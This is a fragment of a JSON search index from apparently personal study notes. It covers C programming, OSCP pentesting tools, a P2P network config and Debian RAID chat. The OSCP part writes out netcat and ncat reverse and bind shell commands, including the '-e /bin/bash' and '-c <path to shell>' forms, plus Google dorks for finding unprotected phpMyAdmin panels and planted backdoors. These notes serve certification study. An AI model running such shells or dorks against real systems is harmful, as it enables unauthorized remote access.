/ b; // c = 2.0, divide using integers d = (float) a / (float) b; // d = 2.6, divide using floats with typecast } * `(typecast_data_type *) pointer` * 0x266 Command-Line Arguments C #include int main(int argc, char *argv[]){ int i; printf(\"There were %d arguments provided:\\n\", argc); for(i=0; i<argc; i++){ printf(\"argument #%d\\t-\\t%s\\n\", i ,argv[i]); } } `` * 0x267 Variable Scoping * static variable` will only be initialised ones * 0x270 Memory Segmentation * five segments: text, data, bss, heap, stack","title":"Hacking the art of exploitation"},{"location":"jd/","text":"JDownloader Knowledge \u00b6 install JD 2.0 Chapter 1 \u00b6 Phasellus posuere in sem ut cursus Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Chapter 2 \u00b6","title":"JDownloader 2.0"},{"location":"jd/#jdownloader-knowledge","text":"install JD 2.0","title":"JDownloader Knowledge"},{"location":"jd/#chapter-1","text":"Phasellus posuere in sem ut cursus Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.","title":"Chapter 1"},{"location":"jd/#chapter-2","text":"","title":"Chapter 2"},{"location":"oscp/","text":"OSCP \u00b6 Tools \u00b6 Bash \u00b6 The task is to get all urls on the page www.cisco.com content of the page can be downloaded with wget www.cisco.com one line of the file looks like that <li><a,href=\"http://newsroom.cisco.com/\">Newsroom</a></li> we can use a one liner to solve the task grep searches for given string cut gets a delimiter with -d and returns the field -f sort -u shows only unique strings 1 grep \"href=\" index.html | cut -d \"/\" -f 3 | grep \"\\.\" | cut -d '\"' -f 1 | sort -u loop over the input of a file line by line 1 for url in $(cat list.txt); do host $url; done Ping Sweep 1 do stuff Info Bind Shell: Server is listening Reverse Shell: Client is listening Netcat \u00b6 Switches used -l listen for connection -n Do not do any DNS or service lookups -v verbose -p source port Chat Client: nc -nv <server ip addr> <open port on server> Sever: nc -nlvp <listening port> File transfer Client: nc -nv <server ip addr> 4444 < sending.exe Sever: nc -nlvp 4444 > incoming.exe Bind Shell Client: nc -vn <server ip addr> 4444 Server: nc -nlvp 4444 -c <path to shell> Reverse Shell Server has no public ip Client: nc -nlvp 4444 Server: nc -vn <client ip addr> 4444 -e /bin/bash Ncat \u00b6 improved Netcat adds: encryption access limitation Bind Shell Client ncat -v <server ip addr> <open port on server> Server ncat -lvp <listening port> -e <path to shell> --allow <client ip addr> --ssl Wireshark \u00b6 Follow TCP Stream Tcpdump \u00b6 Information Gathering \u00b6 Active \u00b6 Passive \u00b6 Google Hacking site:\"<url of website>\" gets all subdomains size of webpresenz -site:\"<url of website>\" exclude these filetype:<file extesion> ex.: ppt, pdf, txt \"<search string>\" search the exact string intitle:\"<string>\" inurl:\"</path/for/search>\" inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin searching for unprotected phpmyadmin panels intitle:\"-N3t\" filetype:php undetectable searching after string found in backdoor Google Hacking Database","title":"OSCP"},{"location":"oscp/#oscp","text":"","title":"OSCP"},{"location":"oscp/#tools","text":"","title":"Tools"},{"location":"oscp/#bash","text":"The task is to get all urls on the page www.cisco.com content of the page can be downloaded with wget www.cisco.com one line of the file looks like that <li><a,href=\"http://newsroom.cisco.com/\">Newsroom</a></li> we can use a one liner to solve the task grep searches for given string cut gets a delimiter with -d and returns the field -f sort -u shows only unique strings 1 grep \"href=\" index.html | cut -d \"/\" -f 3 | grep \"\\.\" | cut -d '\"' -f 1 | sort -u loop over the input of a file line by line 1 for url in $(cat list.txt); do host $url; done Ping Sweep 1 do stuff Info Bind Shell: Server is listening Reverse Shell: Client is listening","title":"Bash"},{"location":"oscp/#netcat","text":"Switches used -l listen for connection -n Do not do any DNS or service lookups -v verbose -p source port Chat Client: nc -nv <server ip addr> <open port on server> Sever: nc -nlvp <listening port> File transfer Client: nc -nv <server ip addr> 4444 < sending.exe Sever: nc -nlvp 4444 > incoming.exe Bind Shell Client: nc -vn <server ip addr> 4444 Server: nc -nlvp 4444 -c <path to shell> Reverse Shell Server has no public ip Client: nc -nlvp 4444 Server: nc -vn <client ip addr> 4444 -e /bin/bash","title":"Netcat"},{"location":"oscp/#ncat","text":"improved Netcat adds: encryption access limitation Bind Shell Client ncat -v <server ip addr> <open port on server> Server ncat -lvp <listening port> -e <path to shell> --allow <client ip addr> --ssl","title":"Ncat"},{"location":"oscp/#wireshark","text":"Follow TCP Stream","title":"Wireshark"},{"location":"oscp/#tcpdump","text":"","title":"Tcpdump"},{"location":"oscp/#information-gathering","text":"","title":"Information Gathering"},{"location":"oscp/#active","text":"","title":"Active"},{"location":"oscp/#passive","text":"Google Hacking site:\"<url of website>\" gets all subdomains size of webpresenz -site:\"<url of website>\" exclude these filetype:<file extesion> ex.: ppt, pdf, txt \"<search string>\" search the exact string intitle:\"<string>\" inurl:\"</path/for/search>\" inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin searching for unprotected phpmyadmin panels intitle:\"-N3t\" filetype:php undetectable searching after string found in backdoor Google Hacking Database","title":"Passive"},{"location":"p2p_network/","text":"P2P Network \u00b6 Summary This article explains how to build a P2P network. Give your clients the following ip addresses: Client 1: IP 10.0.0.1 Client 2: IP 10.0.0.2 Subnet Mask: 255.255.255.252 Only to clients possible IP Calculator Warning code needs to be verified /etc/network/interfaces \u00b6 1 2 3 4 auto enp2s0 iface enp2s0 inet static address 10.0.0.1 netmask 30 Tip Change Jumbo Frame size for better performance. Not adviced if files of a small are used.","title":"P2P Network"},{"location":"p2p_network/#p2p-network","text":"Summary This article explains how to build a P2P network. Give your clients the following ip addresses: Client 1: IP 10.0.0.1 Client 2: IP 10.0.0.2 Subnet Mask: 255.255.255.252 Only to clients possible IP Calculator Warning code needs to be verified","title":"P2P Network"},{"location":"p2p_network/#etcnetworkinterfaces","text":"1 2 3 4 auto enp2s0 iface enp2s0 inet static address 10.0.0.1 netmask 30 Tip Change Jumbo Frame size for better performance. Not adviced if files of a small are used.","title":"/etc/network/interfaces"},{"location":"raid/","text":"mdadm --assemble --scan mdadm --detail --scan >> /etc/mdadm/mdadm.conf mount as always Ich vermute tats\u00e4chlich das der Debian Installer da viel \u00fcbernimmt [15.6., 14:25] Nils Winnwa: Beim erstellen von deinem RAID werden Header auf die Platten geschrieben. So kann, sobald alle Platten zusammen sind, das RAID in beliebiger Reihenfolge zusammen gebaut werden. Siehst du hier: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 root @debian ~ # mdadm --detail /dev/md1 / dev / md1 : Version : 1.2 Creation Time : Fri Dec 27 17 : 02 : 27 2019 Raid Level : raid1 Array Size : 2929608128 ( 2793.89 GiB 2999.92 GB ) Used Dev Size : 2929608128 ( 2793.89 GiB 2999.92 GB ) Raid Devices : 2 Total Devices : 2 Persistence : Superblock is persistent Intent Bitmap : Internal Update Time : Mon Jun 15 14 : 24 : 46 2020 State : clean Active Devices : 2 Working Devices : 2 Failed Devices : 0 Spare Devices : 0 Consistency Policy : bitmap Name : rescue : 1 UUID : 2e88 af1c : 0427 f298 : 8 b393bda : ade45222 Events : 55529 Number Major Minor RaidDevice State 0 8 2 0 active sync / dev / sda2 1 8 18 1 active sync / dev / sdb2 Persistence: Superblock is persistent, sprich alle Ger\u00e4te haben Header und k\u00f6nnen f\u00fcr die Wiederherstellung genutzt werden [15.6., 14:28] Nils Winnwa: Und hier siehst du wie mdadm das Array beim booten zusammen puzzelt: 1 2 3 4 5 root@debian ~ # dmesg | grep -i raid [ 0.000000] Command line: BOOT_IMAGE=/vmlinuz-4.19.0-8-amd64 root=/dev/mapper/raid-root ro nomodeset consoleblank=0 [ 0.208176] Kernel command line: BOOT_IMAGE=/vmlinuz-4.19.0-8-amd64 root=/dev/mapper/raid-root ro nomodeset consoleblank=0 [ 1.887307] md/raid1:md0: active with 2 out of 2 mirrors [ 1.924807] md/raid1:md1: active with 2 out of 2 mirrors","title":"RAID Debian"}]}